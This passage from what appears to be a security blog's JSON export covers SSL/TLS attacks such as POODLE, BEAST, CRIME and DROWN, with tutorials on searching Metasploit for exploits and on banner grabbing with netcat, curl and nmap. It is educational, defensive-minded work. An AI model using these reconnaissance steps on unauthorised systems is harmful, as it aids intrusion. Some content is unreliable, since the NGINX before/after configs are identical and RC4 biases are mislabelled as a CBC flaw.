11.5.1\nAAM 11.4.0 through 11.5.1, AFM 11.3.0 through 11.5.1, Analytics 11.0.0 through 11.5.1, Edge Gateway, WebAccelerator, and WOM 10.1.0 through 10.2.4 and 11.0.0 through 11.3.0, PEM 11.3.0 through 11.6.0, and PSM 10.0.0 through 10.2.4 and 11.0.0 through 11.4.1 and BIG-IQ Cloud and Security 4.0.0 through 4.4.0 and Device 4.2.0 through 4.4.0, when using TLS 1.x before TLS 1.2, does not properly check CBC padding bytes when terminating connections.\n\n### Remediation\n\nCheck CBC padding in TLS stack. \n\nPatch vulnerable TLS implementations (ask vendor)."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-poodle"},"excerpt":"Main Points Discovered by Google security team on October the 14th, 2014.The attack is on SSL 3.0 (SSLv3), an obsolete and insecure…","frontmatter":{"date":"18th January 2022 ","title":"Vulnerabilities in SSL & TLS :- POODLE","description":"In this article, we will look at CVE-2014-3566, also known as the Padding Oracle On Downgraded Legacy (POODLE) vulnerability, which results from support for SSL version 3.0. This attack requires a person-in-the-middle context to force the use of SSL v3.0, which contains an Oracle attack.","tags":"poodle, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- Discovered by Google security team on October the 14th, 2014.\n- The attack is on SSL 3.0 (SSLv3), an obsolete and insecure protocol.\n- Attacker needs to somehow force the client and the server to agree to use the SSL 3.0 protocol. An attacker can do this by tampering with the SSL negotiation process.\n- SSL handshake will try to use the most recently supported version of TLS (starting with say TLS 1.2) at both the client and the server. However, for compatibility reasons, many clients have implemented a fallback mechanism that lets them retry a failed negotiation by using an older version. If an attacker interferes with the SSL negotiation process to disrupt it, the client will then fall back successively to TLS 1.1, TLS 1.0, and finally to SSL 3.0.\n- The vulnerability exploits the way the SSL version 3.0 handles padded bytes when used with Cipher Block Chaining (CBC) mode of operation.\n- Due to SSLv3's under-specification of the contents of the CBC padding bytes, and since SSLv3 did not say what the padding bytes should be, SSL implementations cannot check those padding bytes which opens SSLv3 up to an oracle attack.\n- This may allow a person-in-the-middle attacker to decrypt a selected byte of ciphertext.\n- To decrypt the stream requires as few as 256 SSL version 3 connections; however, they would need to force a victim application to repeatedly send the same data over a newly created SSL version 3.0 connection. This would require social engineering.\n- To exploit this as a web vulnerability, the attacker must possess the following:\n    1. The attacker must control the connection between the client and the server.\n    2. The attacker must be able to inject code into the victim's browser (e.g. JavaScript code) to launch the attack successfully.\n\n## Quick Reference\n\n### Description\n\nVia a person-in-the-middle position, the victim is forced to downgrade to SSL v3.0, which contains an oracle attack. Whether a server or a client - and you do not wish to fall short of this vulnerability - then disable support for SSL completely as per the remediation section. \n\n### Abbreviation\n\nPOODLE\n\n### Name\n\nPadding Oracle On Downgraded Legacy\n\n### CVE Number\n\nCVE-2014-3566\n\n### Type of Vulnerability\n\nA padding-oracle attack - The SSL protocol 3.0 uses nondeterministic CBC padding, which makes it easier for person-in-the-middle attackers to obtain cleartext data via a padding-oracle attack.\n\n### Affected\n\nThis vulnerability affects all SSL version 3.0 compliant products.\n\n### Remediation\n\nDo not Support SSL version 3 or lower.\n\nPlease note that this will break the website connection for IE6 users, should this browser be important for some reason. \n\n```bash\nFor Apache: SSLProtocol all -SSLv2 -SSLv3\nFor Nginx: ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n```\n\n## How to Configure Web Server to Mitigate POODLE Vulnerability\n\nTo protect our web server against [POODLE](https://evilsaint.com/article/vulnerabilities-ssl-tls-poodle/), it is recommended to stop support for SSL version 3.0 or lower. This, however, would still leave us vulnerable to [BEAST](https://evilsaint.com/article/vulnerabilities-ssl-tls-beast/), where it is recommended to stop support for TLS 1.0 as well. \n\n### Apache Web Server\n\nEdit the SSLProtocol directive in the ssl.conf file, which is usually located in /etc/httpd/conf.d/ssl.conf. For example, if you have:\n```\nSSLProtocol all\n```\n\nchange it to:\n```\nSSLProtocol TLSv1.1 TLSv1.2\n```\nThen, restart httpd.\n\n### NGINX\n\nEdit the ssl_protocols directive in the nginx.conf file. For example, if you have:\n```\nssl_protocols TLSv1.1 TLSv1.2;\n```\n\nchange it to:\n```\nssl_protocols TLSv1.1 TLSv1.2;\n```\n\nThen, restart nginx.\n\n### Microsoft IIS\n\nTo disable TLS 1.0 in Microsoft IIS, you must edit the registry settings in Microsoft Windows.\n\n1. Open the registry editor\n\t* Find the key `HKLM SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.0\\Server`\n\t* Change the DWORD value of the Enabled entry to `0`.\n\t* Create a `DisabledByDefault` entry and change the DWORD value to `1`.\n\n2. Repeat the above steps for all versions of SSL."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-ccs-injection-vulnerability"},"excerpt":"Main Points A weakness exists within a certain version of OpenSSL that allows clients and servers to be forced via specifically specially…","frontmatter":{"date":"17th January 2022 ","title":"Vulnerabilities in SSL & TLS :- CCS injection vulnerability","description":"In this article, we will look at CVE Number CVE-2014-0224, also known as the CCS injection vulnerability. This vulnerability results from a flaw in certain versions of OpenSSL that allows an attacker to communicate using weak key material in the hope decrypting traffic later.","tags":"css-injection, openssl, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- A weakness exists within a certain version of OpenSSL that allows clients and servers to be forced via specifically specially crafted handshake packet to use weak key material for communication.\n- Via a person-in-the-middle context an attacker maybe able to decrypt/modify traffic.\n\n## Quick Reference\n\n### Description\n\nA weakness in certain versions of OpenSSL that allows an attacker to use weak key material for communication with the hope decrypting traffic later. \n\n### Name\n\nCCS injection vulnerability\n\n### CVE Number\n\nCVE-2014-0224\n\n### Type of Vulnerability\n\nVulnerability in the OpenSSL library.\n\n### Affected\n\nOpenSSL versions said to be affected include:\n\n- Versions before 0.9.8za\n- 1.0.0 before 1.0.0m\n- 1.0.1 before 1.0.1h\n\n### Remediation\n\nUpgrade to a non-vulnerable version of the OpenSSL Library."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-rc-4-byte-biases"},"excerpt":"Main Points The RC4 algorithm has many byte biases (certain bytes are more (or less) likely to appear than others).An attacker can use…","frontmatter":{"date":"16th January 2022 ","title":"Vulnerabilities in SSL & TLS :- RC4 Byte Biases","description":"In this article, we will look into CVE-2013-2566, also known as RC4 Byte Biases. The RC4 algorithm, which is used in the TLS and SSL protocols, has many single-byte biases, making it easier for remote attackers to carry plaintext-recovery attacks by statistically analysing ciphertext in a large number of sessions that use the same plaintext.","tags":"rc4-byte-biases, ssl","posttype":"article"},"body":"## Main Points\n\n- The RC4 algorithm has many byte biases (certain bytes are more (or less) likely to appear than others).\n- An attacker can use byte biases to recover plaintext bytes at known locations (such as a session token within a cookie) upon encrypting the same plaintext many times and monitoring the ciphertext.\n- This attack requires generation of large data volumes.\n- It is somewhat impractical but highlights a significant flaw within RC4.\n\n## Quick Reference\n\n### Description\n\nThe RC4 algorithm, which is used in the TLS and SSL protocols, has many single-byte biases, making it easier for remote attackers to carry plaintext-recovery attacks by statistically analysing ciphertext in a large number of sessions that use the same plaintext.\n\n### Name\n\nRC4 Byte Biases\n\n### CVE Number\n\nCVE-2013-2566\n\n### Type of Vulnerability\n\nCBC decryption vulnerability\n\n### Affected\n\nConnections supporting RC4\n\n### Remediation\n\nDisable support for RC4 algorithm."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-breach"},"excerpt":"Main Points The attacker must use a different exploit to become a man-in-the-middle and to inject content into the network traffic stream…","frontmatter":{"date":"15th January 2022 ","title":"Vulnerabilities in SSL & TLS :- BREACH","description":"In this article we look at CVE Number CVE-2013-3587 or what is commonly referred as the BREACH attack. The HTTPS protocol can encrypt compressed data without properly obfuscating the length of the unencrypted data, which makes it easier for man-in-the-middle (MitM) attackers to obtain plaintext secret values by observing length differences during a series of guesses in which a string in an HTTP request URL potentially matches an unknown string in an HTTP response body.","tags":"breach, ssl, tls","posttype":"article"},"body":"## Main Points \n\n- The attacker must use a different exploit to become a man-in-the-middle and to inject content into the network traffic stream for this attack to work.\n- The BREACH attack is very similar to how CRIME work but BREACH exploits of vulnerability within the HTTP compression allowing an attacker to identify if text exists within a page.\n- BREACH attack on HTTP request responses, whereas CRIME looks at HTTP requests.\n- The BREACH attack is agnostic to the version of TLS/SSL, and does not require TLS-layer compression (only HTTP compression).\n- The BREACH attack works against any cipher suite.\n- The BREACH attack against stream ciphers is simpler as when performing attacks against block ciphers additional work must be done to align the output to the cipher text blocks.\n- The BREACH attack can be exploited with just a few thousand requests, and can be executed in under a minute**.** The number of requests required will depend on the secret size. The power of the attack comes from the fact that it allows guessing a secret one character at a time.\n\n\n## Quick Reference\n\n### TLDR\n\nThe HTTPS protocol can encrypt compressed data without properly obfuscating the length of the unencrypted data, which makes it easier for man-in-the-middle (MitM) attackers to obtain plaintext secret values by observing length differences during a series of guesses in which a string in an HTTP request URL potentially matches an unknown string in an HTTP response body.\n\n### Abbreviation\n\nBREACH\n\n### Name\n\nBrowser Reconnaissance & Exfiltration via Adaptive Compression of Hypertext\n\n### CVE Number\n\nCVE-2013-3587\n\n### Type of Vulnerability\n\nThe vulnerability is in HTTPS protocol compression. \n\n### Affected\n\nTo be vulnerable, a web application must:\n\n- Be served from a server that uses HTTP-level compression\n- Reflect user-input in HTTP response bodies\n- Reflect a secret (such as a CSRF token) in HTTP response bodies\n\n### Remediation\n\nNo clear mitigation to this attack. The following is a list of potential mitigations in order of effectiveness (not practicality)  provided by breachattack.com\n\n1. Disabling HTTP compression\n2. Separating secrets from user input\n3. Randomizing secrets per request\n4. Masking secrets (effectively randomizing by XORing with a random secret per request)\n5. Protecting vulnerable pages with CSRF\n6. Length hiding (by adding random number of bytes to the responses)\n7. Rate-limiting the requests"},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-beast"},"excerpt":"Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic…","frontmatter":{"date":"14th January 2022 ","title":"Vulnerabilities in SSL & TLS :- BEAST","description":"In this article, we will look at CVE Number CVE-2011-3389, also known as BEAST. BEAST, or Browser Exploit Against SSL/TLS, is a largely theoretical attack that requires a person-in-the-middle to eavesdrop on a connection and downgrade encryption support to (vulnerable) TLS 1.0. This allows attackers to decrypt the traffic and listen in on conversations.","tags":"beast, ssl, tls","posttype":"article"},"body":"## Main Points \n\n- The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work.\n- The attack was carried out for the first time in 2011 by security researchers Thai Duong and Juliano Rizzo (Google Chrome developers), but the theoretical vulnerability was discovered in 2002 by Phillip Rogaway.\n- Thai Duong and Juliano Rizzo created their POC in JavaScript.\n- Researchers found that TLS 1.0 (and older) encryption can be broken quickly, giving the attacker an opportunity to listen in on the conversation.\n- If your server supports TLS 1.0, the attacker can make it believe that this is the only protocol that the client can use. This is called a protocol downgrade attack. Then, the attacker can use the BEAST attack to eavesdrop.\n- The attack leverages weaknesses in cipher block chaining (CBC) to exploit the Secure Sockets Layer (SSL) protocol\n- If the attacker can get into a person-in-the-middle position while the victims are using TLS 1.0, they may silently decrypt secrets.\n\n## Quick Reference\n\n### Description\n\nA vulnerability that allows a person-in-the-middle attacker to eavesdrop on a connection and downgrade encryption support to (vulnerable) TLS 1.0. This allows attackers to decrypt the traffic and listen in on conversations.\n\n### Abbreviation\n\nBEAST\n\n### Name\n\nBrowser Exploit Against SSL/TLS\n\n### CVE Number\n\nCVE-2011-3389\n\n### Type of Vulnerability\n\nIn the SSL protocol and TLS 1.0\n\n### Affected\n\nIf you support TLS 1.0 or any version of SSL, then you are vulnerable to BEAST. \n\nOriginally, the RC4 cipher was recommended for use to mitigate BEAST attacks (because it is a stream cipher, not a block cipher). However, RC4 was later found to be unsafe.\n\n## How to Configure Web Server to Mitigate BEAST Vulnerability\n\nTo protect our web server against [POODLE](https://evilsaint.com/article/vulnerabilities-ssl-tls-poodle/) it is recommended to stop support for SSL version 3.0 or lower. This, however, would still leave us vulnerable to [BEAST](https://evilsaint.com/article/vulnerabilities-ssl-tls-beast/), where it is recommended to stop support for TLS 1.0 as well. \n\n### Apache Web Server\n\nEdit the SSLProtocol directive in the ssl.conf file, which is usually located in /etc/httpd/conf.d/ssl.conf. For example, if you have:\n```\nSSLProtocol all\n```\n\nchange it to:\n```\nSSLProtocol TLSv1.1 TLSv1.2\n```\nThen, restart httpd.\n\n### NGINX\n\nEdit the ssl_protocols directive in the nginx.conf file. For example, if you have:\n```\nssl_protocols TLSv1.1 TLSv1.2;\n```\n\nchange it to:\n```\nssl_protocols TLSv1.1 TLSv1.2;\n```\n\nThen, restart nginx.\n\n### Microsoft IIS\n\nTo disable TLS 1.0 in Microsoft IIS, you must edit the registry settings in Microsoft Windows.\n\n1. Open the registry editor\n\t* Find the key `HKLM SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.0\\Server`\n\t* Change the DWORD value of the Enabled entry to `0`.\n\t* Create a `DisabledByDefault` entry and change the DWORD value to `1`.\n\n2. Repeat the above steps for all versions of SSL."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-crime"},"excerpt":"Main Points The attack was discovered by security researchers Juliano Rizzo and Thai Duong, who cooked up the BEAST SSL exploit.For this…","frontmatter":{"date":"13th January 2022 ","title":"Vulnerabilities in SSL & TLS :- CRIME","description":"This article will examine CVE 2012-4929, also known as the CRIME vulnerability. To obtain plaintext HTTP headers, attackers with person-in-the-middle context can compare length differences between a string in an HTTP request and an unknown string in an HTTP header.","tags":"crime, ssl, tls","posttype":"article"},"body":"## Main Points \n\n- The attack was discovered by security researchers Juliano Rizzo and Thai Duong, who cooked up the BEAST SSL exploit.\n- For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream.\n- The CRIME (Compression Ratio Info-leak Made Easy) attack is a vulnerability in SSL/TLS compression.\n- CRIME is a side-channel attack that uses the compressed size of HTTP requests to discover session tokens or other secret information.\n- The technique exploits SSL/TLS-protected web sessions when they use one of two data-compression schemes (DEFLATE and gzip) built into the protocol and used to reduce network congestion or the loading time of web pages.\n- In order to carry out the attack, the attacker must have control over the plaintext as well as the ability to intercept the encrypted message.\n- On secret web cookies transmitted over compressed HTTPS or SPDY connections, this attack exposes cookie data to session hijacking.\n- When the size of the compressed content is reduced, it can be inferred that some part of the injected content is likely to match some part of the source.\n\n## Quick Reference\n\n### Description\n\nCRIME is a vulnerability in SSL/TLS compression that allows attackers with person-in-the-middle context to compare length differences between a string in an HTTP request and an unknown string in an HTTP header.\n\n### Abbreviation\n\nCRIME \n\n### Name\n\nCompression Ratio Info-leak Made Easy\n\n### CVE Number\n\nCVE-2012-4929\n\n### Type of Vulnerability\n\nThe vulnerability is within TLS compression. \n\n### Affected\n\nTLS compression is required for the connection. The attacker requires a person-in-the-middle position, the ability to control plaintext on a website visited by the victim, and the ability to intercept encrypted messages.\n\n### Remediation\n\nDisable SSL/TLS compression to prevent the CRIME attack. CRIME can be defeated by preventing the use of compression, either at the client end, by disabling compression of SPDY requests in the browser, or by the website preventing the use of data compression on such transactions using the TLS protocol negotiation features."},{"fields":{"slug":"/searching-metasploit"},"excerpt":null,"frontmatter":{"date":"11th January 2022 ","title":"Searching Metasploit","description":"","tags":"metasploit","posttype":"tutorial"},"body":"\n# Searching Metasploit\n\nSearch for payloads, exploits, or post modules\n\n```ruby\nsearch type:payload\nsearch type:exploit\nsearch type:post\n```\n\nSearch for all modules that operate on a given port (e.g. FTP, SSH, HTTP)\n\n```ruby\nsearch port:21\nsearch port:22\nsearch port:80\n```\n\nSearch all CVEs from 2011\n\n```ruby\nsearch cve:2011\n```\n\nCareful when analysing the results of this above command. If you use the above example you might see a row like\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/a706cbf8-d01d-4895-9c5d-ea82775626c3.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Snippet From Search for CVE from 2011 </figcaption></figure>\n\n```ruby\n68   exploit/unix/webapp/joomla_tinybrowser                            2009-07-22\n```\n\nThis example shows the disclosure date as a date in 2009. If we check the module however the module information. We can see the CVE is actually dated 2011 ([https://nvd.nist.gov/vuln/detail/CVE-2011-4908](https://nvd.nist.gov/vuln/detail/CVE-2011-4908))\n\n```ruby\ninfo exploit/unix/webapp/joomla_tinybrowser\n```\n\nSearch by Exploit DB\n\n```ruby\nsearch edb:9296\n```\n\nSearch for exploits by their AKA\n```ruby\nsearch aka:shellshock\nsearch aka:heartbleed\nsearch aka:eternalblue\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/2dd2c2c8-f46d-4f43-ad73-d1688a5371de.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Metasploit Search For Heartbleed </figcaption></figure>\n\nSearch by platform\n```ruby\nsearch platform:windows\nsearch platform:linux\nsearch platform:mac\n```\n\nOr exclude a platform\n\n```ruby\nsearch platform:-windows\n```\n\nThere are a few other options that we can add and we will go through some advanced search examples and introduce them. \n\nIn this search, we are looking for results that contain only exploits with an associated CVE released in 2017. We exclude any results that are for the Windows platform. Then we filter out by the exploits that operate on port 80 with a rank of ‘excellent’ \n\n```ruby\nsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent\n```\n\nAs you can see we can get very specific in what we are looking for by chaining search criteria together.\n\nIf we add the word ‘check’ to the end of our search then we will only see modules that have a Metasploit check included. \n\n<aside>\n💡 the `check` command is available for some modules. The check command is designed so you can test if the target is vulnerable before attempting to exploit it.\n\n</aside>\n\nThe full command\n\n```ruby\nsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check \n```\n\nAt the current time of writing, I am down to 5 results with the above search. We wanted to test all these modules but we wanted to order them. These are the modules as we currently see them. \n\n```ruby\n#  Name                                                              Disclosure Date  Rank       Check  Description\n   -  ----                                                              ---------------  ----       -----  -----------\n   0  exploit/linux/http/jenkins_cli_deserialization                    2017-04-26       excellent  Yes    Jenkins CLI Deserialization\n   1  exploit/linux/http/kaltura_unserialize_cookie_rce                 2017-09-12       excellent  Yes    Kaltura Remote PHP Code Execution over Cookie\n   2  exploit/multi/http/october_upload_bypass_exec                     2017-04-25       excellent  Yes    October CMS Upload Protection Bypass Code Execution\n   3  exploit/multi/http/shopware_createinstancefromnamedarguments_rce  2019-05-09       excellent  Yes    Shopware createInstanceFromNamedArguments PHP Object Instantiation RCE\n   4  exploit/unix/http/zivif_ipcheck_exec                              2017-09-01       excellent  Yes    Zivif Camera iptest.cgi Blind Remote Command Execution\n```\n\n If we add the `-s` option we can pick a target field for us to search on. Options are \"rank\", \"disclosure_date\", \"name\", \"date\", \"type\", \"check”. \n\nWe can see from the example that the results are already sorted by name so `-s name` at first might seem pointless as this is the default. \n\n- jenkins_cli_deserialization\n- kaltura_unserialize_cookie_rce\n- october_upload_bypass_exec\n- shopware_createinstancefromnamedarguments_rce\n- zivif_ipcheck_exec\n\nHowever, we can also reverse the search entries so we get the results starting Z and working back to J. \n\n```ruby\nsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check -s name -r\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/e83e8a98-93c0-46e4-a1a2-5f3ac4ad0111.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Reverse Name Order Search</figcaption></figure>\n\n\nOr we can search by date order (which of course can be reversed)\n\n```ruby\nsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check -s date\nsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check -s date -r \n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/4b1d7537-a1d0-4f8d-9860-302f79e2c2da.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Reverse Date Order Search</figcaption></figure>\n\nWhat if we are happy with our results but we want to save them so we can work through them and mark them off? Metasploit allows you to export your results to a CSV\n\n```\n::ruby\nsearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check  -o /tmp/output.csv\n[*] Wrote search results to /tmp/output.csv\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/3714d5e4-addd-4458-8d4f-9783762aec6d.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Export to CSV</figcaption></figure>\n\nAnother example where we search for all Metasploit modules of type exploit, for the Windows platform and operate on port 445 (SMB). We then specify the ‘check’ column as the search column meaning the exploits will be sorted by those that have a ‘check’ option first and then we output the result to CSV. \n\n```\n::ruby\nsearch type:exploit platform:windows port:445 -s check -o /tmp/windows-smb.csv\n```\n\nLastly, what if we wanted to perform a search and then export that search to a CSV file as a oneliner without remaining in the Metasploit console. \n\n```ruby\nmsfconsole -qx 'search type:exploit platform:windows port:445 -o /tmp/win-smb.csv;exit'\n```"},{"fields":{"slug":"/banner-grabbing-introduction"},"excerpt":"Netcat By sending the following HTTP request via:\n\nnc 192.168.0.10 80 \nGET / HTTP/1.1  \nHost: vulnerable \n<enter>  \n<enter>\n\n\nSaving Banners…","frontmatter":{"date":"11th January 2022 ","title":"Banner Grabbing Introduction","description":"In this tutorial we will look at banner grabbing using various software. Banner grabbing is a reconnaissance technique that retrieves software banner information by querying services running on an open port. This banner can typically contain important information about the service; potentially, we can find information such as the name and version of the software. If we can successfully identify the software, we can check for known vulnerabilities.","tags":"banner-grabbing, enumeration","posttype":"tutorial"},"body":"\n## Netcat\n\nBy sending the following HTTP request via:\n\n```bash\nnc 192.168.0.10 80 \nGET / HTTP/1.1  \nHost: vulnerable \n<enter>  \n<enter>\n```\n\nSaving Banners to a file and parsing in input to ncat rather than typing\n```\necho \"GET / HTTP/1.1\" > input.txt\necho \"\" >> input.txt\necho \"\" >> input.txt\nnc -nvv -o banners.txt 192.168.0.10 80 < input.txt\n```\n\n  \nIt is possible to retrieve information on the version of PHP and the web server used just by observing the HTTP headers sent back by the server:  \n```\nHTTP/1.1 200 OK  \nDate: Thu, 24 Nov 2011 04:40:51 GMT  \nServer: Apache/2.2.16 (Debian)  \nX-Powered-By: PHP/5.3.3-7+squeeze3  \nVary: Accept-Encoding  \nContent-Length: 1335  \nContent-Type: text/html  \n```\n\nWe can try a banner grab with a spoofed User Agent Browser\n```bash\nnc 192.168.0.10 80  \nGET / HTTP/1.1  \nHost: 192.168.0.10  \nUser-Agent: SPOOFED-BROWSER  \nReferrer: K0NSP1RACY.COM  \n<enter>  \n<enter>\n```\n  \n  \n  \n## HTTPS\n  \nIf the application was only available via HTTPS, telnet or netcat would not be able to communicate with the server, the tool openssl can be used:  \n```\nroot@kali:~/# openssl s_client -connect vulnerable:443  \n```\n\n## Curl\n\n```bash\nroot@root:/# curl -I domain.co.uk\nHTTP/1.1 200 OK\nDate: Wed, 05 Apr 2017 20:26:26 GMT\nServer: Apache/2.4.23 (Unix)\nX-Powered-By: PHP/5.4.45\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nSet-Cookie: PHPSESSID=cfn55sh9vqnr0dm55go05a2852; path=/\nX-Hostname: sweb14\nContent-Type: text/html; charset=UTF-8\n```\n\n\n## NMAP\n\n```bash\nroot@evilsaint:/# nmap -sV -p 80 --script=banner yahoo.co.uk\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2017-04-05 21:32 BST\nNmap scan report for yahoo.co.uk (217.12.15.37)\nHost is up (0.0052s latency).\nOther addresses for yahoo.co.uk (not scanned): 72.30.203.4 206.190.42.177\nPORT   STATE SERVICE    VERSION\n80/tcp open  http-proxy Apache Traffic Server\n|_http-server-header: ATS\nService Info: Host: media-router-rc3.prod.media.ir2.yahoo.com\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.35 seconds\n```\n\n## Telnet\n\nBanner Grab FTP\n```\ntelnet ip_address 21\n```\n\nBanner Grab SSH\n```\ntelnet ip_address 22\n```\n\nBanner Grab Telnet\n```\ntelnet ip_address \n```\n\nBanner Grab HTTP\n```bash\nroot@root:/# telnet domain.co.uk 80\nTrying 46.32.240.39...\nConnected to domain.co.uk.\nEscape character is '^]'.\nGET / HTTP/1.1\n\nHTTP/1.1 400 Bad Request\nDate: Wed, 05 Apr 2017 20:50:08 GMT\nServer: Apache/2.4.23 (Unix)\nContent-Length: 303\nContent-Type: text/html; charset=iso-8859-1\n```"},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-logjam"},"excerpt":"Main Points For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the…","frontmatter":{"date":"10th January 2022 ","title":"Vulnerabilities in SSL & TLS :- Logjam","description":"In this article we will look at the SSL Logjam vulnerability. This is a person-in-the-middle attack, similar to FREAK, that exposes Export Grade cipher suites. This time, Diffie-Hellman is used instead of RSA.","tags":"logjam, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream.\n- Very similar to FREAK except this time, Diffie-Hellman is used instead of RSA.\n- Diffie-Hellman key exchange is a popular cryptographic algorithm that allows Internet protocols to agree on a shared key and negotiate a secure connection. It is essential to many protocols, including HTTPS, SSH, IPsec, SMTPS, and those that rely on TLS.\n- The Logjam vulnerability allows a person-in-the-middle attacker to downgrade vulnerable TLS connections to 512-bit export-grade cryptography.\n\n## Quick Reference\n\n### Description\n\nThe SSL Logjam vulnerability allows attackers within person-in-the-middle context to exposes Export Grade cipher suites to downgrade TLS connections.\n\n### Name\n\nLogjam\n\n### CVE Number\n\nClosest thing to an official CVE number is CVE-2015-4000. \n\n### Type of Vulnerability\n\nMethod for attacking Die-Hellman (DH) key exchange\n\n### Affected\n\nThe TLS protocol 1.2 and earlier when a DHE_EXPORT cipher suite is enabled. \n\n### Remediation\n\n Disable support for export cipher suites and use a 2048-bit Diffie-Hellman group."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-freak"},"excerpt":"Main Points In the 1990s, the US government established rules governing the strength of encryption that could be exported (\"Export keys\").…","frontmatter":{"date":"9th January 2022 ","title":"Vulnerabilities in SSL & TLS :- FREAK","description":"In this article, we will look at CVE-2015-0204, also known as the FREAK attack. This attack makes use of a person-in-the-middle position to allow end clients to communicate using RSA Export Keys, which were a form of weak strength RSA encryption keys capped at 512 bits. The US government imposed this in the 1990s to prevent the encryption from being used against them. The idea was to give protection from a modest system but not prevent the NSA from decrypting it.","tags":"freak, ssl, tls","posttype":"article"},"body":"## Main Points \n\n- In the 1990s, the US government established rules governing the strength of encryption that could be exported (\"Export keys\").\n- In any Secure Socket Layer (SSL) implementations aimed at export, these rules limited the strength of the RSA encryption keys to a maximum of 512 bits.\n- The RSA Export keys were designed to allow exports to contain encryption that could not be broken by a typical computing resource but could be broken by the NSA.\n- For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream.\n- The FREAK attack necessitates a person-in-the-middle position in order to change the initial HTTP packet that is sent out when negotiating cipher use to request \"Export Keys.\"\n- The use of “Export Keys” suites was stopped, and by the year 2000, browsers could use a higher-security SSL.\n- Attack Narrative\n    1. An attacker gains a person-in-the-middle position between two computers. \n    2. Victim requests a secure connection to a webpage. The victims browser sends a \"Client Hello message\" to the server asking for typical cipher suites. \n    3. The attacker intercepts the conversation and substitutes the requested cipher suites with a request for ‘export RSA’\n    4. The server agrees and accepts the request (not understanding that it was modified). It responds with a 512-bit export RSA key.\n    5. The client accepts ‘export RSA’ (not understanding that its request was modified).\n    6. Attacker breaks weaker keys (first done by a researcher in 1999, modern cloud computing makes this much easier) and obtains information.\n\n## Quick Reference \n\n### Abbreviation\n\nFREAK \n\n### Name\n\nFactoring RSA Export Keys\n\n### CVE Number\n\nCVE-2015-0204\n\n### Type of Vulnerability\n\nThe vulnerability is in the ciphers with which the system is willing to communicate. They cannot be negotiated if the weak cipher is removed. It is a simple fix.\n\n### Affected\n\nAny system willing to negotiate RSA Export Keys. \n\n### Remediation\n\nDisable support for weak export-grade ciphers\n\n### Mediation\n\nRemove any weak ciphers from your configuration. Refuse to communicate using weak ciphers. This way the person-in-the-middle cipher negotiation cannot be modified to support RSA Export Keys."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-drown"},"excerpt":"Main Points For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the…","frontmatter":{"date":"8th January 2022 ","title":"Vulnerabilities in SSL & TLS :- DROWN","description":"In this article we look at CVE Number CVE-2016-0800, also known as the DROWN vulnerability. Decrypting RSA with Obsolete and Weakened eNcryption (DROWN) is an attack that demonstrates that even if you do not allow SSLv2, simply supporting it can be dangerous.","tags":"drown, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream.\n- At the time of public disclosure on March 2016, it was indicated 33% of all HTTPS servers were vulnerable to the attack.\n- At the time of the public disclosure in March 2016, it was estimated that 33% of all HTTPS servers were vulnerable to the attack.\n- Takes hours to retrieve data unless a specific version of OpenSSL is used, which is known to allow for a one minute average decryption rate rather than a four hour average decryption rate.\n- Another attack that relies on export grade cryptography; introduced to comply with US government restrictions in the 1990s.\n- DROWN demonstrates that simply allowing SSLv2, even if no legitimate clients use it, poses a risk to modern servers and clients. It allows an attacker to decrypt modern TLS connections between up-to-date clients and servers by sending probes to any server that supports SSLv2 and uses the same private key.\n- At the time of publication (August 2016), the team behind the paper \"DROWN: Breaking TLS Using SSLv2\" was able to attack and decrypt a TLS 1.2 handshake using 2048-bit RSA in under eight 